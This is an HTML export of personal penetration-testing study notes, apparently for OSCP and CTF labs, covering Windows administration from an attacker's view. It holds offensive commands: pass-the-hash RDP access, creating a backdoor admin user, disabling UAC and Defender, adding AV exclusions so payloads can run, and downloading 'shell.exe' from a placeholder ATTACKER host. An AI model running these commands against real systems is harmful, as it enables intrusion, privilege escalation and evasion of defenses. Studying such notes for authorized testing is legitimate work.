<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Sysadmin Stuff</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Sysadmin Stuff</h1><br/><p><h1>Manage Firewall</h1></p><p>[OSCP 35]</p><p></p><p><h2>View FW Config Profiles</h2></p><p><em>netsh advfirewall show allprofiles</em></p><p></p><p><h2>Add Rule</h2></p><p><em>netsh advfirewall firewall add rule name=&quot;Allow SMB In&quot; dir=in action=allow protocol=tcp remoteip=10.10.89.147</em></p><p></p><p><em>netsh advfirewall firewall add rule name=&quot;Allow outbound&quot; dir=out action=allow protocol=tcp remoteip=10.2.10.249</em></p><p></p><p><h3>Specify Port</h3></p><p>The previous commands would allow connections from the specified range of IP addresses, but the <span style="color:#ff0000;">firewall may still block specific ports</span> if there are other rules in place restricting them. For example:</p><p><ol><li>If there is another rule specifically blocking TCP port 445, then SMB traffic on that port could still be blocked.</li></ol></p><p><ol><li>If there are restrictions in place for certain applications or services, those might still be enforced despite the rule allowing incoming traffic from the specified IP.</li></ol></p><p></p><p>To ensure specific ports are allowed, you&#39;d need to explicitly specify the port (or port range) in the rule. For example, if you want to allow SMB specifically on port 445, you would modify the rule to reference that local port.</p><p></p><p><em>netsh advfirewall firewall add rule name=&quot;Allow SMB In&quot; dir=in action=allow protocol=tcp remoteip=10.2.10.249 localport=445</em></p><p></p><p><em>netsh advfirewall firewall add rule name=&quot;Allow Outbound&quot; dir=out action=allow protocol=tcp remoteport=9999</em></p><p></p><p><h1>RDP</h1></p><p><a name="RDP w/o creds"></a><h2>Connecting without Creds</h2></p><p>If you only have a user&#39;s NTLM hash, you still may be able to use that account for RDP access.</p><p></p><p><h3>PtH (Admin)</h3></p><p>The user needs to be a <span style="color:#ff0000;">Local Admin</span> on the target machine in order to RDP into it via PtH. If they are a Local Admin, you can also <a href="PrivEsc--Windows--Sysadmin_Stuff_51.html#Enable RDP">enable RDP</a> if it isn&#39;t already running.</p><p></p><p><h3>OPtH</h3></p><p>See <a href="PrivEsc--Windows--Active_Directory_10.html#OPtH">OPtH</a>. <span style="color:#ff0000;">Admin privs aren&#39;t needed</span>. First leverage the NTLM hash to <a href="PrivEsc--Windows--Sysadmin_Stuff--Kerberos_104.html#Obtain a TGT">obtain a TGT</a> &amp; verify it&#39;s in your terminal session with <strong>klist</strong>.</p><p></p><p>If this host is in the same Domain as the target machine, it should use KRB Auth by default, &amp; <strong>mstsc</strong> will use the TGT.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: You can stack RDP connections (may get laggy). For example, use <strong>xfreerdp3</strong> to connect to <strong>evil01</strong> &amp; then use <strong>mstsc</strong> to RDP into <strong>client02</strong>.</p><p></p><p><span style="color:#f66151;text-decoration:underline;">IMPORTANT</span>: If you specify an IP Address instead of the FQDN, <strong>mstsc</strong> will fall back to NTLM Auth instead of KRB.</p><p></p><p><em>mstsc /v:client02.example.com</em></p><p></p><p><a name="RDP Permissions"></a><h2>RDP Permissions</h2></p><p>Membership in either the <strong>Remote Desktop Group</strong> group or the Local <strong>Administrators</strong> group is the default way to grant a user RDP permissions. This is what these notes will reference for simplicity.</p><p></p><p>However, there are other ways to give a user RDP access (e.g. via an <span style="color:#ff0000;">ACL</span>, membership in a <span style="color:#ff0000;">custom group</span>, etc).</p><p></p><p><h3>Local Permissions</h3></p><p>You need RDP permissions (typically membership in the <strong>Remote Desktop Group</strong>) on the machine you&#39;re remotely accessing, but don&#39;t need them on the machine you&#39;re currently using.</p><p></p><p>If bob wants to use <strong>client02</strong> to RDP into <strong>evil01</strong>, they need to be in the <strong>Remote Desktop Group</strong> on <strong>evil01</strong>, but bob doesn&#39;t need any groups / privs on <strong>client02</strong>.</p><p></p><p><h3>Active Directory Permissions</h3></p><p>To use RDP in an AD env, an account needs 1 of the following:</p><p><ol><li>RDP permissions granted Locally on the Windows machine being accessed.</li></ol></p><p><ol><li>RDP permissions granted at the Domain level.</li></ol></p><p></p><p>Domain level permissions often use a custom group &amp; grant access to multiple machines.</p><p></p><p><h3>Relevance</h3></p><p>If bob RDPs into <strong>evil01</strong> from <strong>client02</strong> &amp; Local permissions are used, you may / may not be able to RDP back into <strong>client02</strong> (or any hosts other than <strong>evil01</strong>).</p><p></p><p>However, if Domain level perms are used, it&#39;s very likely that bob will be able to RDP into many machines (which may / may not include the DC).</p><p></p><p><a name="Enable RDP"></a><h2>Enable RDP</h2></p><p><h3>CME via SMB</h3></p><p>Requires Local Admin access &amp; SMB connection</p><p></p><p><em>crackmapexec smb IP -d skylark.com -u backup_service -p It4Server -M rdp -o ACTION=enable</em></p><p></p><p><h3>Powershell</h3></p><p>I *believe* the following works, no guarantees. More details on <a href="https://www.reddit.com/r/PowerShell/comments/8qbxn5/enabling_rdp/">Reddit</a>.</p><p></p><p><em>Set-ItemProperty -Path &quot;HKLM:\System\CurrentControlSet\Control\Terminal Server&quot; -Name &quot;fDenyTSConnections&quot; -Value 0</em><em></em></p><p><em>Set-ItemProperty -Path &quot;HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; -Name &quot;UserAuthentication&quot; -Value 1</em><em></em></p><p><em>Enable-NetFirewallRule -DisplayGroup &quot;Remote Desktop&quot;</em></p><p></p><p><h2>Access Shared Drive</h2></p><p>A Shared Drive is <span style="color:#ff0000;">NOT in </span><strong><span style="color:#ff0000;">C:\</span></strong> &amp; is instead accessed via a UNC Path.</p><p></p><p>If the Shared Drive is from another Domain joined machine, it&#39;ll probably be found in <strong>\\HOSTNAME\</strong>.</p><p></p><p>You can use <strong>xfreerdp</strong> to share a directory with the machine that you&#39;re connecting to. In this case, your directory will be under <strong>\\tsclient\</strong></p><p></p><p><em>xfreerdp ... /drive:/usr/share/windows-resources/mimikatz/x64/</em></p><p></p><p><h3>Path Name</h3></p><p>When you share a directory using <strong>xfreerdp</strong>, the <strong>/</strong> in the file path will be replaced with <strong>_</strong> . If you need to use PS to invoke a shared file, you can quickly convert the file path into this syntax with <a href="https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'/'%7D,'_',true,false,true,false)">Cyberchef</a>.</p><p></p><p><strong>\\tsclient\_usr_share_windows-resources_mimikatz_x64_\</strong></p><p></p><p><h2>Troubleshooting</h2></p><p><h3>Run Powershell without Icons (GUI Glitch)</h3></p><p>[Win 109]</p><p></p><p>The desktop was black &amp; the only icon was <strong>USB Disconnect</strong>. I needed to run PS as Admin, but you normally have to Right Click the PS icon to do so.</p><p></p><p>If you&#39;re using a method that utilizes built-in Key Combos for Windows, it won&#39;t work if these same Key Shortcuts are mapped to something on your Linux machine!</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Super Key</span>: <strong>Windows Key</strong> + <strong>R</strong> should open the “Run” prompt. Type “powershell” &amp; hit Enter. If the PS icon appears on the task bar, you can Right Click &amp; run PS as Admin.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Task Manager</span>: You can run PS using Task Manager. There are multiple methods for starting Task Manager, &amp; some don&#39;t require a Key Combo.</p><p><ol><li><strong>Ctrl</strong> + <strong>Alt</strong> + <strong>Del</strong></li></ol></p><p><ol><li><strong>Windows Key</strong> + <strong>R</strong> &amp; enter <strong>taskmgr</strong></li></ol></p><p><ol><li>Right Click the <strong>USB</strong> icon → <strong>Devices &amp; Printers</strong> then backtrack to <strong>Control Panel</strong> &amp; search <strong>Task</strong>...</li></ol></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Admin PS via Task Manager</span>: If you don&#39;t see these options after starting Task Manager, look for a Drop Down button (e.g. <strong>View More</strong>, <strong>More Info</strong>, or <strong>More Details</strong>). The names vary depending on the version of Windows.</p><p></p><p>At the top of the window, click <strong>File</strong> ↓ <strong>New Task</strong></p><p></p><p>OR</p><p></p><p><strong>Run new Task</strong></p><p></p><p>Enter <strong>powershell</strong> &amp; check the <strong>launch as admin</strong> box.</p><p></p><p><h1>User Management</h1></p><p><h2>Local Users</h2><h2></h2></p><p><h2></h2><h3>List all Local Users</h3></p><p><em>net user</em></p><p></p><p><h3>Info about Specific Local User</h3></p><p><em>net user bob</em><h2></h2></p><p><h2></h2><h2></h2></p><p><h2></h2><h3>Create Local User</h3><h2></h2></p><p><h2></h2><em><span style="color:#000000;">net user dave2 password123! /add</span></em><h2></h2></p><p><h2></h2><h2></h2></p><p><h2></h2><h3>Add User to Local Group</h3></p><p><em>net localgroup administrators dave2 /add</em></p><p></p><p><em>net localgroup &quot;Remote Desktop Users&quot; dave2 /add</em><h2></h2></p><p><h2></h2><h2></h2></p><p><h2>Domain Users</h2><span style="color:#663e0e;"></span></p><p><span style="color:#663e0e;"></span><em>net user bob /domain</em></p><p></p><p><h1>Group Management</h1></p><p><h2>Domain Groups</h2></p><p><h3>List Domain Groups</h3></p><p><em>Get-ADGroup -Filter *</em></p><p></p><p><em>Get-ADGroup -Filter &#39;Name -like &quot;HR*&quot;&#39;</em> <em>| Select-Object Name, SamAccountName, Description</em></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">List Groups in a Specific Organizational Unit (OU)</span>: To list groups within a specific Organizational Unit (OU), use the <strong>-SearchBase</strong> parameter. </p><p></p><p><em>Get-ADGroup -Filter * -SearchBase &quot;OU=Groups,DC=domain,DC=com&quot;</em></p><p></p><p><h3>Create Domain Groups</h3></p><p>For example, the following commands make <strong>HR_Managers</strong> a nested group within <strong>HR</strong>. Now, all members of <strong>HR_Managers</strong> will inherit the permissions and roles associated with <strong>HR</strong>.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Even if an account has high privs on the Local machine, that doesn&#39;t necessarily mean they also have enough privs to manage Domain groups.</p><p></p><p># Create parent group HR</p><p><em>New-ADGroup -Name &quot;HR&quot; -GroupCategory Security -GroupScope Global -Path &quot;CN=Users,DC=domain,DC=com&quot;</em></p><p></p><p># Create child group HR_Managers</p><p><em>New-ADGroup -Name &quot;HR_Managers&quot; -GroupCategory Security -GroupScope Global -Path &quot;CN=Users,DC=domain,DC=com&quot;</em></p><p></p><p># Add HR_Managers group to HR group as a member</p><p><em>Add-ADGroupMember -Identity &quot;HR&quot; -Members &quot;HR_Managers&quot;</em></p><p></p><p><h1>Process Management</h1></p><p><h2>Kill a Process</h2></p><p><strong>{CMD} </strong><em>taskkill /F /IM mysql.exe</em></p><p></p><p><h3>Kill Remote Process</h3></p><p>Sysinternals <strong>pskill</strong> can be used to terminate a process on a remote machine if you&#39;ve got creds.</p><p></p><p><h2>Process Ownership</h2></p><p>If you&#39;ve sufficient privs, check owner of a process with-</p><p></p><p><strong>{CMD} </strong><em>task</em>list /V</p><p></p><p><strong>{GUI}</strong> <em>Task Manager</em> → <em>Services</em> ↓ R click SVC → Go to Details</p><p></p><p></p><p></p><p><a name="UAC Intergrity"></a><h1>UAC Integrity Level</h1></p><p>[OSCP 136-137 &amp; 217, Win (Msfconsole UAC Bypass?)]</p><p></p><p><span style="color:#ff0000;">Even if your user should have high enough permissions</span> to do something, you may be <span style="color:#ff0000;">blocked from performing that action if your shell isn&#39;t </span>running with a <span style="color:#ff0000;">high enough intergirty level</span>. See <a href="https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control">Hacktricks</a>.</p><p></p><p><h2>Check UAC</h2></p><p><h3>Confirm UAC is Enabled</h3></p><p>The following output shows that UAC is Enabled. If it&#39;s 1 then UAC is activated, if its 0 or it doesn&#39;t exist, then UAC is inactive.</p><p></p><p><em>REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA</em></p><p></p><p><strong>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System</strong><strong></strong></p><p><strong>    EnableLUA    REG_DWORD   </strong><strong><span style="color:#ff0000;"> 0x1</span></strong></p><p></p><p><h3>Check Integrity Level</h3></p><p><em>REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin</em></p><p></p><p><strong>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System</strong><strong></strong></p><p><strong>    ConsentPromptBehaviorAdmin    REG_DWORD    </strong><strong><span style="color:#ff0000;">0x5</span></strong></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Number Meanings</span></p><p><strong>0</strong>: UAC won&#39;t prompt (like disabled)</p><p></p><p><strong>1</strong>: The admin is asked for username and password to execute the binary with high rights (on Secure Desktop)</p><p></p><p><strong>2</strong>: (Always notify me) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)</p><p></p><p><strong>3</strong>: like 1 but not necessary on Secure Desktop</p><p></p><p><strong>4</strong>: like 2 but not necessary on Secure Desktop</p><p></p><p><strong>5</strong>: (default) it will ask the administrator to confirm to run non Windows binaries with high privileges</p><p>    </p><p><h3>Additional Checks</h3></p><p><span style="color:#8ff0a4;text-decoration:underline;">LocalAccountTokenFilterPolicy</span>: If the value of <strong>LocalAccountTokenFilterPolicy</strong> is <strong>0</strong>, then, only the RID 500 user (built-in Administrator) is able to perform admin tasks without UAC, and if its <strong>1</strong>, all accounts inside &quot;Administrators&quot; group can do them.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">FilterAdministratorToken</span>: Next, look at the value of the key, <strong>FilterAdministratorToken</strong>.</p><p></p><p>If <strong>0</strong> (default), the built-in Administrator account can do remote administration tasks and if <strong>1</strong> the built-in account Administrator cannot do remote administration tasks, unless <strong>LocalAccountTokenFilterPolicy</strong> is set to <strong>1</strong>.</p><p></p><p><h2>Bypass UAC</h2></p><p>There are many different UAC Bypass methods, some may only work when done from certain accounts while others may be more generically applicable.</p><p></p><p><h3>Disable UAC</h3></p><p>Using a high privilege account (SYSTEM in this case), I just disabled UAC using the following command.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: There was a follow up command mentioned in the <a href="https://stackoverflow.com/questions/42581334/elevate-without-prompt-verb-runas-start-process/42699934#42699934">StackOverflow comment</a> that I didn&#39;t use. It may be useful in certain situations?</p><p></p><p><em>REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f</em></p><p></p><p><h3>Run PS as Admin w/o Prompt</h3></p><p>After bypassing / disabling UAC, you can run the following command to launch an Admin PS terminal. Normally this wouldn&#39;t work remotely, because UAC would ask for a confirmation prompt that can&#39;t be seen from a Reverse Shell / WinRM.</p><p></p><p><em>Start-Process -FilePath &quot;powershell&quot; -Verb RunAs -ArgumentList &quot;-enc ENCODED_PAYLOAD&quot;</em></p><p></p><p><h1>File Transfer</h1></p><p>[OSCP 35-37] Many more methods in notes not listed here.</p><p></p><p><h2>Different Methods for Different Permissions</h2></p><p><span style="color:#ff0000;">Diff methods</span> of file transfer <span style="color:#ff0000;">may require diff perms</span>! For example, unable to upload via FTP but able to use <em>scp</em> (SSH).</p><p></p><p>This could be due to the fact that FTP writes to a specific dir which a user may not have access to, whereas scp can use diff destination directories.</p><p></p><p><h2>Writable Destination Directories</h2></p><p>Common locations for universal R/W access are listed below. If those don&#39;t work, you can use a PS 1-Liner to determine which directories you can write to.</p><p></p><p><strong>\Users\Public</strong></p><p></p><p><strong>%TEMP%</strong></p><p></p><p><strong>C:\\Windows\\system32\\spool\\drivers\\color\\</strong></p><p></p><p><h3>Find Writable Directories</h3></p><p>The following Powershell 1-Liner outputs filepaths that you can write to.</p><p></p><p><em>(Get-ChildItem -Path &quot;C:\path\to\search&quot; -Directory -Recurse -ErrorAction SilentlyContinue | Where-Object { try { $f = [System.IO.Path]::Combine($_.FullName, [System.IO.Path]::GetRandomFileName()); $s = [System.IO.File]::Create($f); $s.Close(); Remove-Item $f -Force; $true } catch { $false } }).FullName</em></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Alternate Command</span>: Output isn&#39;t as clean, but should also work.</p><p></p><p><em>Get-ChildItem -Path &quot;C:\path\to\search&quot; -Directory -Recurse -ErrorAction SilentlyContinue | Where-Object { try { $f = [System.IO.Path]::Combine($_.FullName, [System.IO.Path]::GetRandomFileName()); $s = [System.IO.File]::Create($f); $s.Close(); Remove-Item $f -Force; Write-Output $_.FullName; $true } catch { $false } }</em></p><p></p><p><h2>Output File Name</h2></p><p>I&#39;ve seen file uploads get rejected, or files getting deleted from the disk, based off of the file name used. Idk how common this is IRL, but <span style="color:#ff0000;">may help to masquerade the file as a common, acceptable binary</span> (e.g nc.exe or default executable).</p><p></p><p><h2>curl</h2></p><p><h3>Troubleshooting</h3></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Protocol http not supported</span></p><p>Error appeared when I enclosed URL in single quotes, but worked normally when using double quotes. Use syntax like- “http://example.com” </p><p></p><p><h2>wget</h2></p><p></p><p><h2>Invoke-WebRequest / iwr</h2></p><p>If certain strings are blocked, the full command may be better than the alias, or vice versa.</p><p></p><p><em>iwr -uri http://ATTACKER/FILE -outfile \Users\Public\FILE</em></p><p></p><p><h2>Background Intelligent Transfer Service (BITS) </h2></p><p>bitsadmin is technically deprecated &amp; replaced with the PS Bits Cmdlets, but it often still works.</p><p></p><p><h3>BitsTransfer</h3></p><p>More info &amp; examples <a href="https://www.howtogeek.com/devops/how-to-use-the-bits-module-to-transfer-files-using-powershell/">here</a>. This is used from a Powershell terminal.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Saw someone start with <strong>Import-Module BitsTransfer</strong>, but isn&#39;t that unnecessary? Shouldn&#39;t this be a built-in Cmdlet that doen&#39;t need anything imported (unless you&#39;re importing a <a href="https://learn.microsoft.com/en-us/powershell/module/bitstransfer/start-bitstransfer?view=windowsserver2022-ps#example-2-create-bits-transfer-jobs-that-download-multiple-files">list of files to download</a>)?</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Basic Usage</span>: In this example, you&#39;re writing to PWD. Ensure you&#39;ve got the necessary R/W perms wherever you&#39;re writing to!</p><p></p><p><em>$url=&quot;http://ATTACKER:8000/shell.exe&quot;</em><em></em></p><p><em>Start-BitsTransfer -Source $url -Destination .</em></p><p></p><p><h3>bitsadmin</h3></p><p></p><p><h2>Using Web App</h2></p><p>If target has very limited binaries, but there&#39;s a Web App that allows file uploads (with or without authentication), you may be able to use that to transfer files to the target.</p><p></p><p>From there you could upload a something like a busyboxy static binary (I think there is a compatible version for Windows, or at least something similar) which would allow you to use standard methods for file transfers.</p><p></p><p><h3>Web App Renames File</h3></p><p>The Web App may rename the file that you upload, so the target may save the file as a random string of characters. In this case, it <span style="color:#ff0000;">helps to know the directory that files are saved to</span>.</p><p></p><p>You can <span style="color:#ff0000;">identify located files by comapring the file size</span> or the <span style="color:#ff0000;">file&#39;s hash</span>.</p><p></p><p><h3>Copy &amp; Paste Binary</h3></p><p>You can copy a file&#39;s contents from your machine &amp; paste it to the target machine. If the file is a binary there will be non-printable characters, so you&#39;ll need to encode it first.</p><p></p><p><h2>SMB</h2></p><p>See <a href="Recon_+_Services--SMB_11.html#run smb server">SMB</a></p><p></p><p><h3>Transfer Large Files</h3></p><p>See these <a href="Recon_+_Services--SMB_11.html#large files">methods</a></p><p></p><p><h2>RCE Protocols</h2></p><p><h3>WinRM</h3></p><p>evil-winrm</p><p></p><p><h3>RDP</h3></p><p>xfreerdp</p><p></p><p><h3>SSH</h3></p><p>scp</p><p></p><p><h2>FTP</h2></p><p></p><p><h1>Nesting Quotes</h1></p><p>The method that works may vary based on a variety of factors (e.g. PS vs CMD, the R Shell used, the tool that&#39;s taking the arguments, etc).</p><p></p><p><h2>Escaping Quotes</h2></p><p>Backslashes are only special if they&#39;re in front of a quote or backslash! This worked for CMD when passing args via SweetPotato</p><p></p><p><em>“/c net localgroup \”Remote Management Users\&quot; dave2 /add&quot;</em></p><p></p><p><h2>Alternate Single &amp; Double</h2></p><p>Try both variations-</p><p></p><p><em>&#39;/c net localgroup ”Remote Management Users&quot; dave2 /add&#39;</em></p><p></p><p><em>“/c net localgroup &#39;Remote Management Users&#39; dave2 /add&quot;</em></p><p></p><p><h2>Lawless Nesting</h2></p><p>Allegedly, you can use one of the following syntaxes-</p><p></p><p><em>“/c net localgroup ”Remote Management Users&quot; dave2 /add&quot;</em></p><p></p><p><em>“&quot;/c net localgroup ”Remote Management Users&quot; dave2 /add&quot;&quot;</em></p><p></p><p><h1>Enumerate Available Commands</h1></p><p>[CTF2 99]</p><p>Useful in restricted Env with limited commands. May also <span style="color:#ff0000;">reveal Custom Commands</span> which could be useful for Pentesting.</p><p></p><p><em>Get-Command</em></p><p></p><p><h2>Command Help</h2></p><p>Some of these options may not be supported, so try them all going down the list. For example, the Command is <strong>Get-ServicesApplication</strong></p><p></p><p><em>Get-Help Get-ServicesApplication</em><em></em></p><p><em>Get-Help Get-ServicesApplication -Detailed</em><em></em></p><p><em>Get-Help Get-ServicesApplication -Full</em><em></em></p><p><em>Get-Command -ShowCommandInfo...</em></p><p></p><p><h1>File System</h1></p><p><h2>Listing Drives</h2></p><p>I don&#39;t think this requires administrative privileges, but saw contradictory user reports. The following commands should be interchangable?</p><p></p><p><em>wmic logicaldisk get caption</em></p><p></p><p><em>wmic logicaldisk get name</em></p><p></p><p><a name="removing files"></a><h2>Removing Files</h2></p><p><span style="color:#ff0000;">If you can&#39;t remove the file</span> (i.e Permission / <strong>Access is Denied</strong>), <span style="color:#ff0000;">may still be able to MOVE the file</span>! (&amp; <span style="color:#ff0000;">vice versa</span>?)</p><p></p><p><strong>{PS}</strong> <em>Remove-Item -Path .\veyon-service.exe</em></p><p></p><p><strong>{CMD}</strong> <em>del .\veyon-server.exe</em>			(del is also an alias for PS)</p><p></p><p><em>move .\veyon-service.exe .\veyon-service.exe.moved</em></p><p></p><p><h1>Disable AV using PS</h1></p><p>The following may / may not work. It seemed to disable AV only in certain cases for some actions. The <span style="color:#ff0000;">more reliable method</span> seems to be <span style="color:#ff0000;">adding a folder as an exception</span> for AV (next section).</p><p></p><p><em>Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend</em></p><p></p><p><h2>Add a Folder as Exception for AV</h2></p><p>Must specify fully path to the folder, with trailing<strong> \</strong>. This will let you launch payloads from here (e.g. create this exception using Administrator, set SVC to execute payload binary in this folder, then launch the SVC to get SYSTEM).</p><p></p><p><em>Add-MpPreference -ExclusionPath C:\Users\Administrator\Documents\</em></p><p></p><p><h1>Github</h1></p><p><h2>Clone a Repository</h2></p><p>Optionally specify a name for the repository by appending it to the end; otherwise it&#39;ll use the default name. Useful when PoCs are named after the CVE.</p><p></p><p><em>git clone https://github.com/godylockz/CVE-2024-23897.git godylockz</em></p></div>
</body>
</html>
